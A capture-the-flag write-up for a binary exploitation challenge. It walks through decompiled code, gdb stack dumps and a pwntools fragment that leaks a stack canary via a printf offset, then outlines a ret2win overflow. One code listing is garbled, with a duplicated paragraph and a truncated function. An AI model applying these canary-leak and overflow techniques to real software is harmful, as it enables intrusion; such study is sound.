# Enumeration

First of all, we start with a `checksec`:  

![Screenshot from 2025-03-27 00-38-37](https://github.com/user-attachments/assets/3920eca5-f740-4ad0-ad07-975e511cdbbb)



### Disassembly

Starting with `main()`:

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  duckling(argc, argv, envp);
  return 0;
}

```

As we can see, `main` only calls `duckling()`. Taking a look there.

```c
unsigned __int64 duckling()
{
  char *v1; // [rsp+8h] [rbp-88h]
  _QWORD buf[4]; // [rsp+10h] [rbp-80h] BYREF
  _QWORD v3[11]; // [rsp+30h] [rbp-60h] BYREF
  unsigned __int64 v4; // [rsp+88h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  memset(buf, 0, sizeof(buf));
  memset(v3, 0, 80);
  printf("Quack the Duck!\n\n> ");
  fflush(_bss_start);
  read(0, buf, 0x66uLL);
  v1 = strstr((const char *)buf, "Quack Quack ");
  if ( !v1 )
  {
    error("Where are your Quack Manners?!\n");
    exit(1312);
  }
  printf("Quack Quack %s, ready to fight the Duck?\n\n> ", v1 + 32);
  read(0, v3, 0x6AuLL);
  puts("Did you really expect to win a fight against a Duck?!\n");
  return v4 - __readfsqword(0x28u);
}
```

As we can see, there are 2 buffers, `buf[4]` and `v3[11]` of unknown size so far. The juice of the challenge is these 2 lines:

```c
  read(0, buf, 0x66uLL);
  v1 = strstr((const char *)buf, "Quack Quack ");
  printf("Quack Quack %s, ready to fight the Duck?\n\n> ", v1 + 32);
```

Our first input goes to `buf` and we get a leak of `v1 + 32`. That means we can leak up to `32` from the end of the buffer 
where the string `Quack Quack ` is found in our input string. Luckily, we see that we can leak the `canary` address at such offset when debug.
After that, we can overflow the second buffer and perform a `ret2win`. There is a function called `duck_attack` that prints the flag.

```c
unsigned __int64 duck_attack()
{
  char buf; // [rsp+3h] [rbp-Dh] BYREF
  int fd; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v3; // [rsp+8h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  fd = open("./flag.txt", 0);
  if ( fd < 0 )
  {
    perror("\nError opening flag.txt, please contact an Administrator\n");
    exit(1);
  }
  while ( read(fd, &buf, 1uLL) > 0 )
    fputc(buf, _bss_start);
  close(fd);.
After that, we can overflow the second buffer and perform a `ret2win`. There is a function called `duck_attack` that prints the flag.

```c
unsigned __int64 duck_attack()
{
  char buf; // [rsp+3h] [rbp-Dh] BYREF
  return v3 - __readfsqword(0x28u);
}
```

### Debugging 

Now, to prove all this theory we can check the debugging. Running the program and adding 8 "A". After `read`, we see the status of `$rsi`.

```gdb
pwndbg> x/20gx $rsi
0x7fffffffdd80:	0x4141414141414141	0x000000000000000a // 0x10
0x7fffffffdd90:	0x0000000000000000	0x0000000000000000 // 0x20
0x7fffffffdda0:	0x0000000000000000	0x0000000000000000 // 0x30
0x7fffffffddb0:	0x0000000000000000	0x0000000000000000 // 0x40
0x7fffffffddc0:	0x0000000000000000	0x0000000000000000 // 0x50
0x7fffffffddd0:	0x0000000000000000	0x0000000000000000 // 0x60
0x7fffffffdde0:	0x0000000000000000	0x0000000000000000 // 0x70
0x7fffffffddf0:	0x0000000000000000	0x5c9f27b935a3ab00 // 0x80
0x7fffffffde00:	0x00007fffffffde20	0x000000000040162a
0x7fffffffde10:	0x0000000000000000	0x5c9f27b935a3ab00
```
![image](https://github.com/user-attachments/assets/543c1298-bbd7-4150-92b8-1616e78584cb)

We see that the canary lies at `0x80` from the start of the buffer. As we can leak up to `0x20` bytes, we can find out that we leak the canary address (7 bytes and adding the last 0 due to `read`) at `0x71` bytes.

```python
r.sendlineafter('> ', b'A'* (0x65 - len('Quack Quack ')) + b'Quack Quack ')

r.recvuntil('Quack Quack ')

canary = u64(r.recv(7).rjust(8, b'\x00'))
```

After that, we need to calculate where we start to write our second input and check the `canary` and `return address` offsets.

```gdb
pwndbg> x/20gx $rsi
0x7fffffffdda0:	0x0000000a42424242	0x0000000000000000 // 0x10
0x7fffffffddb0:	0x0000000000000000	0x0000000000000000 // 0x20
0x7fffffffddc0:	0x0000000000000000	0x0000000000000000 // 0x30
0x7fffffffddd0:	0x0000000000000000	0x0000000000000000 // 0x40
0x7fffffffdde0:	0x0000000000000000	0x0000000000000000 // 0x50
0x7fffffffddf0:	0x0000000000000000	0x4d559fb679f97c00 // 0x60
0x7fffffffde00:	0x00007fffffffde20	0x000000000040162a
0x7fffffffde10:	0x0000000000000000	0x4d559fb679f97c00
0x7fffffffde20:	0x0000000000000001	0x00007ffff7c29d90
0x7fffffffde30:	0x0000000000000000	0x0000000000401605
```

We see that the `canary` is at `0x58` bytes from the start of the second buffer. Then a dummy address and then the `return address`. Knowing all this and the address of `duck_attack()`, we can craft our exploit.

# Solution


Flag --> HTB{XXX}

